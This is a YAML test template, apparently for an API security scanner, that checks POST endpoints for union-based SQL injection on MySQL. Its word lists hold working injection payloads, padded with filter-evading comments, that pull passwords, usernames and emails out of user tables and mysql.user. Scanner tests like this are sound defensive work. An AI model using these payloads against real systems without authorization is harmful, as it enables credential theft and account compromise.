id: UNION_SUBQUERY_EXTRACT_PASSWORD_MYSQLI_POST
info:
  name: "Union based SQL Injection test with Subquery to extract Passwords Payload for MySQL on POST method APIs"
  description: "The Union-Based SQL Injection Test with Subquery to Extract Passwords Payload for MySQL on POST Method APIs aims to identify vulnerabilities in an application where union-based SQL injection can be leveraged to extract sensitive data, specifically passwords. By injecting a carefully crafted payload with a subquery, an attacker can manipulate the SQL query executed by the backend to retrieve user credentials stored in the database. This type of attack targets applications that improperly validate and sanitize user inputs, leading to potential data breaches."
  details: "The Union-Based SQL Injection Test with Subquery to Extract Passwords Payload for MySQL on POST Method APIs involves injecting a malicious payload into the SQL query, exploiting the union-based SQL injection vulnerability. This test specifically includes a subquery designed to extract sensitive data, such as passwords, from the database. The attacker can leverage this technique to bypass authentication and retrieve encrypted or hashed passwords from the application's database. Effective mitigation requires proper input validation, prepared statements, and parameterized queries to prevent SQL injection attacks."
  impact: "The impact of the Union-Based SQL Injection Test with Subquery to Extract Passwords Payload for MySQL on POST Method APIs can be severe, allowing attackers to extract sensitive user data, such as passwords, directly from the database. This could lead to unauthorized access to user accounts, credential leakage, and potential further exploitation of the system. If successful, it can compromise the integrity of the application, expose confidential information, and result in a significant security breach. Effective patching is critical to protect against this type of vulnerability."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: UNION_SUBQUERY_EXTRACT_PASSWORD_MYSQLI_POST
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

api_selection_filters:
  method:
    eq: "POST"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts

  request_payload:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  unionBasedPayloads:
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(username,0x3a,password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(email,0x3a,password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(user(),0x3a,password)/**/FROM/**/mysql.user), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(database(),0x3a,password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(current_user(),0x3a,password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(schema(),0x3a,password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(version(),0x3a,password)/**/FROM/**/users), null--"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(host,0x3a,user,0x3a,password)/**/FROM/**/mysql.user), null--"
    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(password, 0x2c, address) FROM users), null--"
  unionBasedNegativePayloads:
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(username,0x3a,password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(email,0x3a,password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(user(),0x3a,password)/**/FROM/**/mysql.user), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(database(),0x3a,password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(current_user(),0x3a,password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(schema(),0x3a,password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(version(),0x3a,password)/**/FROM/**/users), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT/**/GROUP_CONCAT(host,0x3a,user,0x3a,password)/**/FROM/**/mysql.user), null WHERE 1=0 --"
    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(password, 0x2c, address) FROM users), null WHERE 1=0 --"

execute:
  type: multiple
  requests:
  - req:
    - modify_body_param:
        userKey: ${userVal}${unionBasedPayloads}
    - validate:
        response_code:
          gte: 200
          lt: 300
        response_payload:
          length:
            gt: 0
          not_contains:
            - Error
            - Internal Server 
            - Fail
            - Unauthorized
            - access denied
            - Forbidden
            - Method Not allowed
            - Gateway timeout
            - request timeout
            - server error
            - server busy
            - authentication error
            - authorization error
            - validation error
            - Permission Denied
            - invalid
            - token expired
            - session expired
            - session timeout
            - unexpected error
            - unable to process request
            - bad request
            - service unavailable
            - account is locked
            - account is blocked
            - multiple failed attempts
            - Attention Required!
            - CloudFlare
            - Sorry, you have been blocked
            - " UNION"
            - "GROUP_CONCAT"
            - <html>
            - </html>
    - success: x2
    - failure: exit
  - req:
    - modify_body_param:
        userKey: ${userVal}${unionBasedNegativePayloads}
    - validate:
        response_code:
          gte: 200
          lt: 300
        response_payload:
          length:
            gt: 0  
          not_contains:
            - Error
            - Internal Server 
            - Fail
            - Unauthorized
            - access denied
            - Forbidden
            - Method Not allowed
            - Gateway timeout
            - request timeout
            - server error
            - server busy
            - authentication error
            - authorization error
            - validation error
            - Permission Denied
            - invalid
            - token expired
            - session expired
            - session timeout
            - unexpected error
            - unable to process request
            - bad request
            - service unavailable
            - account is locked
            - account is blocked
            - multiple failed attempts  
            - Attention Required!
            - CloudFlare
            - Sorry, you have been blocked 
            - " UNION"
            - "GROUP_CONCAT" 
            - <html>
            - </html>
          neq: "${x1.response.body}"
    - success: vulnerable
        

   
  